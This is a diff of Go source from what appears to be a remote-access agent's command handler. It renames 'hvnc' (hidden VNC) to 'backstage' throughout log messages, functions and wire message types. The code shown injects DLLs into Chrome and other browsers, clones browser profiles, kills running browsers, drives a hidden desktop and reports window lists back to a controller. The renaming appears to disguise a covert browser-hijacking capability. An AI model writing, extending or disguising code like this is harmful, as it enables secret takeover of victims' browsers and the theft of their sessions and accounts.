-		log.Printf("hvnc: start chrome injected path=%q dllSize=%d", chromePath, len(dllBytes))
+		log.Printf("backstage: start chrome injected path=%q dllSize=%d", chromePath, len(dllBytes))
 		captureDllBytes := extractCaptureDLLBytes(payload)
 		sendCommandResultSafe(env, cmdID, true, "")
-		goSafe("hvnc_start_chrome_injected", nil, func() {
-			if err := capture.StartHVNCChromeInjected(chromePath, dllBytes, captureDllBytes); err != nil {
-				log.Printf("hvnc: chrome injected failed: %v", err)
+		goSafe("backstage_start_chrome_injected", nil, func() {
+			if err := capture.StartbackstageChromeInjected(chromePath, dllBytes, captureDllBytes); err != nil {
+				log.Printf("backstage: chrome injected failed: %v", err)
 			}
 		})
 		return nil
 
-	case "hvnc_start_browser_injected":
+	case "backstage_start_browser_injected":
 		payload, _ := envelope["payload"].(map[string]interface{})
 		browser := ""
 		exePath := ""
@@ -2021,15 +2021,15 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 			sendCommandResultSafe(env, cmdID, false, "no browser specified")
 			return nil
 		}
-		log.Printf("hvnc: start browser injected browser=%q path=%q clone=%v cloneLite=%v killIfRunning=%v display=%d dllSize=%d", browser, exePath, clone, cloneLite, killIfRunning, display, len(dllBytes))
+		log.Printf("backstage: start browser injected browser=%q path=%q clone=%v cloneLite=%v killIfRunning=%v display=%d dllSize=%d", browser, exePath, clone, cloneLite, killIfRunning, display, len(dllBytes))
 		captureDllBytes := extractCaptureDLLBytes(payload)
 		sendCommandResultSafe(env, cmdID, true, "")
-		goSafe("hvnc_start_browser_injected", nil, func() {
+		goSafe("backstage_start_browser_injected", nil, func() {
 			var onProgress capture.CloneProgressFunc
 			if clone {
 				onProgress = func(percent int, copiedBytes, totalBytes int64, status string) {
-					_ = wire.WriteMsg(context.Background(), env.Conn, wire.HVNCCloneProgress{
-						Type:        "hvnc_clone_progress",
+					_ = wire.WriteMsg(context.Background(), env.Conn, wire.BackstageCloneProgress{
+						Type:        "backstage_clone_progress",
 						Browser:     browser,
 						Percent:     percent,
 						CopiedBytes: copiedBytes,
@@ -2039,24 +2039,24 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 				}
 			}
 			onDXGIStatus := func(success bool, gpuPID uint32, message string) {
-				_ = wire.WriteMsg(context.Background(), env.Conn, wire.HVNCDXGIStatus{
-					Type:    "hvnc_dxgi_status",
+				_ = wire.WriteMsg(context.Background(), env.Conn, wire.BackstageDXGIStatus{
+					Type:    "backstage_dxgi_status",
 					Success: success,
 					GPUPid:  gpuPID,
 					Message: message,
 				})
 			}
 			onLaunchStatus := func(step string, success bool, detail string) {
-				_ = wire.WriteMsg(context.Background(), env.Conn, wire.HVNCBrowserLaunchStatus{
-					Type:    "hvnc_browser_launch_status",
+				_ = wire.WriteMsg(context.Background(), env.Conn, wire.BackstageBrowserLaunchStatus{
+					Type:    "backstage_browser_launch_status",
 					Browser: browser,
 					Step:    step,
 					Success: success,
 					Detail:  detail,
 				})
 			}
-			if err := capture.StartHVNCBrowserInjected(browser, exePath, dllBytes, captureDllBytes, clone, cloneLite, killIfRunning, display, onProgress, onDXGIStatus, onLaunchStatus); err != nil {
-				log.Printf("hvnc: browser injected failed for %q: %v", browser, err)
+			if err := capture.StartbackstageBrowserInjected(browser, exePath, dllBytes, captureDllBytes, clone, cloneLite, killIfRunning, display, onProgress, onDXGIStatus, onLaunchStatus); err != nil {
+				log.Printf("backstage: browser injected failed for %q: %v", browser, err)
 			}
 		})
 		return nil
@@ -2178,7 +2178,7 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 		return nil
 	case "virtual_request_keyframe":
 		log.Printf("hidden: request full frame")
-		capture.RequestHVNCFullFrame()
+		capture.RequestbackstageFullFrame()
 		sendCommandResultSafe(env, cmdID, true, "")
 		return nil
 	case "virtual_mouse_move":
@@ -2302,9 +2302,9 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 		sendCommandResultSafe(env, cmdID, true, "")
 		goSafe("virtual_window_list", nil, func() {
 			windows, monitors := capture.VirtualEnumWindows()
-			winEntries := make([]wire.HVNCWindowEntry, 0, len(windows))
+			winEntries := make([]wire.BackstageWindowEntry, 0, len(windows))
 			for _, w := range windows {
-				winEntries = append(winEntries, wire.HVNCWindowEntry{
+				winEntries = append(winEntries, wire.BackstageWindowEntry{
 					Title:       w.Title,
 					X:           w.X,
 					Y:           w.Y,
@@ -2315,9 +2315,9 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 					Monitor:     w.Monitor,
 				})
 			}
-			monEntries := make([]wire.HVNCMonitorEntry, 0, len(monitors))
+			monEntries := make([]wire.BackstageMonitorEntry, 0, len(monitors))
 			for _, m := range monitors {
-				monEntries = append(monEntries, wire.HVNCMonitorEntry{
+				monEntries = append(monEntries, wire.BackstageMonitorEntry{
 					Index:   m.Index,
 					Name:    m.Name,
 					X:       m.X,
@@ -2327,8 +2327,8 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 					Primary: m.Primary,
 				})
 			}
-			_ = wire.WriteMsg(context.Background(), env.Conn, wire.HVNCWindowListResult{
-				Type:     "hvnc_window_list_result",
+			_ = wire.WriteMsg(context.Background(), env.Conn, wire.BackstageWindowListResult{
+				Type:     "backstage_window_list_result",
 				Windows:  winEntries,
 				Monitors: monEntries,
 			})
